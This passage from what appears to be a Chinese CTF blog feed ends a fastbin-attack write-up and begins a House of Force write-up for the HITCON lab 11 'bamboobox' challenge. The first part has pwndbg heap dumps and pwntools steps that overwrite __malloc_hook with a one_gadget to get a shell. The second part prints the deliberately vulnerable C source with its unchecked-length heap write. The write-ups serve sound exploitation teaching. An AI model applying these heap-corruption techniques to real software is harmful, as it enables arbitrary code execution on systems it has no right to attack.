class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4（fastbin）</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557570f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5（unsortedbin）</span><br><span class="hljs-number">0x555555757100</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:  <span class="hljs-number">0x0000555555757010</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:  <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br>                <span class="hljs-comment">#index4（此处发生了改变）#（此处发生了改变）     </span><br><span class="hljs-number">0x5fcead987a0</span>:  <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000001</span><br>                <span class="hljs-comment">#（此处发生了改变）     #index6（原index5）</span><br><span class="hljs-number">0x5fcead987b0</span>:  <span class="hljs-number">0x0000000000000080</span>  <span class="hljs-number">0x0000555555757120</span><br></code></pre></td></tr></tbody></table></figure><h4 id="2-3-修改index4的fd指针"><a href="#2-3-修改index4的fd指针" class="headerlink" title="2-3 修改index4的fd指针"></a>2-3 修改index4的fd指针</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址</span><br><span class="hljs-comment">#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小</span><br><span class="hljs-comment">#这个地址是main_arena-0x40+0xd,具体看后面图片解释</span><br>payload = p64(libc_base+<span class="hljs-number">0x3c4aed</span>)<br>fill(<span class="hljs-number">2</span>, payload)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4（fastbin）</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x00007ffff7dd1aed</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#更改index4的fd指针</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557570f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5（unsortedbin）</span><br><span class="hljs-number">0x555555757100</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/16gx <span class="hljs-number">0x00007ffff7dd1aed</span><br><span class="hljs-number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="hljs-number">301</span>&gt;:<span class="hljs-number">0xfff7dd0260000000</span><span class="hljs-number">0x000000000000007f</span><br><span class="hljs-number">0x7ffff7dd1afd</span>:<span class="hljs-number">0xfff7a92ea0000000</span><span class="hljs-number">0xfff7a92a7000007f</span><br><span class="hljs-number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="hljs-number">5</span>&gt;:<span class="hljs-number">0x000000000000007f</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b1d</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b2d</span> &lt;main_arena+<span class="hljs-number">13</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b3d</span> &lt;main_arena+<span class="hljs-number">29</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b4d</span> &lt;main_arena+<span class="hljs-number">45</span>&gt;:<span class="hljs-number">0x5555757080000000</span><span class="hljs-number">0x0000000000000055</span><br><span class="hljs-number">0x7ffff7dd1b5d</span> &lt;main_arena+<span class="hljs-number">61</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h4 id="2-4-控制-malloc-hook"><a href="#2-4-控制-malloc-hook" class="headerlink" title="2-4 控制__malloc_hook"></a>2-4 控制__malloc_hook</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index7</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:  <span class="hljs-number">0x0000555555757010</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000060</span><br>                <span class="hljs-comment">#index4（此处发生了改变）#（此处发生了改变）     </span><br><span class="hljs-number">0x5fcead987a0</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                <span class="hljs-comment">#（此处发生了改变）     #index6（原index5）</span><br><span class="hljs-number">0x5fcead987b0</span>:  <span class="hljs-number">0x0000000000000080</span>  <span class="hljs-number">0x0000555555757120</span><br><span class="hljs-number">0x5fcead987c0</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000060</span><br>    <span class="hljs-comment">#index7</span><br><span class="hljs-number">0x5fcead987d0</span>:<span class="hljs-number">0x00007ffff7dd1afd</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h4 id="2-5-写入-one-gadget-并-getshell"><a href="#2-5-写入-one-gadget-并-getshell" class="headerlink" title="2-5 写入 one_gadget 并 getshell"></a>2-5 写入 one_gadget 并 getshell</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#然后往malloc_hook上写one_gadget的地址</span><br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(libc_base+<span class="hljs-number">0x4527a</span>)<br>fill(<span class="hljs-number">6</span>, payload)<br>gdb.attach(p)<br></code></pre></td></tr></tbody></table></figure><h4 id="2-6-最后申请一个chunk"><a href="#2-6-最后申请一个chunk" class="headerlink" title="2-6 最后申请一个chunk"></a>2-6 最后申请一个chunk</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x60</span>)<br></code></pre></td></tr></tbody></table></figure><p>最后就能get shell 了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;fastbin-attack中的Arbitrary-Alloc（例题）&quot;&gt;&lt;a href=&quot;#fastbin-attack中的Arbitrary-Alloc（例题）&quot; class=&quot;headerlink&quot; title=&quot;fastbin_attack中的Arbitr</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="fastbin attack" scheme="https://kylinxin.github.io/tags/fastbin-attack/"/>
    
  </entry>
  
  <entry>
    <title>House of Force</title>
    <link href="https://kylinxin.github.io/2023/09/12/House%20of%20Force/"/>
    <id>https://kylinxin.github.io/2023/09/12/House%20of%20Force/</id>
    <published>2023-09-12T15:14:29.000Z</published>
    <updated>2023-09-13T07:29:40.853Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-Of-Force（控制top-chunk）（基础）"><a href="#House-Of-Force（控制top-chunk）（基础）" class="headerlink" title="House Of Force（控制top_chunk）（基础）"></a>House Of Force（控制top_chunk）（基础）</h1><blockquote><p>参考资料：<br>CTF-wiki：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a><br>附件下载：<br>链接: <a href="https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA">https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA</a>  密码: np57<br>–来自百度网盘超级会员V3的分享<br>    House Of Force是一种堆的利用方法，其主要原理是控制heap中的top_chunk并malloc来达到控制任意内存的空间。</p></blockquote><blockquote><p>题目来源：HITCON training lab 11<br>附件：<br>链接: <a href="https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ">https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ</a>  密码: abtk<br>–来自百度网盘超级会员V3的分享</p></blockquote><hr><h2 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h2><p>老规矩，checksec一下文件先</p><p class='item-img' data-src='https://s2.loli.net/2023/09/12/Pph1H9f6lM5enLQ.png'><img src="https://s2.loli.net/2023/09/12/Pph1H9f6lM5enLQ.png" alt="Snipaste_2023-09-12_17-08-13.png"></p><p>计算一下 main_arena 距离 libc 的距离</p><p class='item-img' data-src='https://s2.loli.net/2023/09/12/xrSK93Ij7bPctEV.png'><img src="https://s2.loli.net/2023/09/12/xrSK93Ij7bPctEV.png" alt="Snipaste_2023-09-12_20-25-47.png"></p><h2 id="程序源代码-c"><a href="#程序源代码-c" class="headerlink" title="程序源代码(c)"></a>程序源代码(c)</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> {</span><br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-type">char</span> *name;<br>};<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> <span class="hljs-title">itemlist</span>[100] =</span> {<span class="hljs-number">0</span>};<br><br><span class="hljs-type">int</span> num;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hello_message</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"There is a box with magic"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"what do you want to do in the box"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">goodbye_message</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"See you next time"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Thanks you"</span>);<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">box</span> {</span><br>  <span class="hljs-type">void</span> (*hello_message)();<br>  <span class="hljs-type">void</span> (*goodbye_message)();<br>};<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bamboobox Menu"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1.show the items in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2.add a new item"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3.change the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4.remove the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5.exit"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice:"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_item</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {<br>      <span class="hljs-keyword">if</span> (itemlist[i].name) {<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d : %s"</span>, i, itemlist[i].name);<br>      }<br>    }<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">""</span>);<br>  }<br>}<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">add_item</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> sizebuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> length;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-keyword">if</span> (num &lt; <span class="hljs-number">100</span>) {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>    read(<span class="hljs-number">0</span>, sizebuf, <span class="hljs-number">8</span>);<br>    length = atoi(sizebuf);<br>    <span class="hljs-keyword">if</span> (length == <span class="hljs-number">0</span>) {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild length"</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    }<br>   <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {<br>      <span class="hljs-keyword">if</span> (!itemlist[i].name) {<br>        itemlist[i].size = length;<br>        itemlist[i].name = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(length);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the name of item:"</span>);<br>        size = read(<span class="hljs-number">0</span>, itemlist[i].name, length);<br>        itemlist[i].name[size] = <span class="hljs-string">'\x00'</span>;<br>        num++;<br>        <span class="hljs-keyword">break</span>;<br>      }<br>    }<br><br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"the box is full"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_item</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> indexbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">char</span> lengthbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> length;<br>  <span class="hljs-type">int</span> index;<br>  <span class="hljs-type">int</span> readsize;<br><br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, indexbuf, <span class="hljs-number">8</span>);<br>    index = atoi(indexbuf);<br>    <span class="hljs-keyword">if</span> (itemlist[index].name) {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>      read(<span class="hljs-number">0</span>, lengthbuf, <span class="hljs-number">8</span>);<br>      length = atoi(lengthbuf);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the new name of the item:"</span>);<br>      readsize = read(<span class="hljs-number">0</span>, itemlist[index].name, length);<br>      *(itemlist[index].name + readsize) = <span class="hljs-string">'\x00'</span>;<br>    } <span class="hljs-keyword">else</span> {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>}<br><span class="hljs-type">void</span> <span class="hljs-title function_">remove_item</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">char</span> indexbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> index;<br><br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, indexbuf, <span class="hljs-number">8</span>);<br>    index = atoi(indexbuf);<br>    <span class="hljs-keyword">if</span> (itemlist[index].name) {<br>      <span class="hljs-built_in">free</span>(itemlist[index].name);<br>      itemlist[index].name = <span class="hljs-number">0</span>;<br>      itemlist[index].size = <span class="hljs-number">0</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"remove successful!!"</span>);<br>      num--;<br>    } <span class="hljs-keyword">else</span> {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild index"</span>);<br>    }<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">magic</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> fd;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br>  fd = open(<span class="hljs-string">"./flag"</span>, O_RDONLY);<br>  read(fd, buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>  close(fd);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, buffer);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>}<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> choicebuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> choice;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">box</span> *<span class="hljs-title">bamboo</span>;</span><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  bamboo = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> 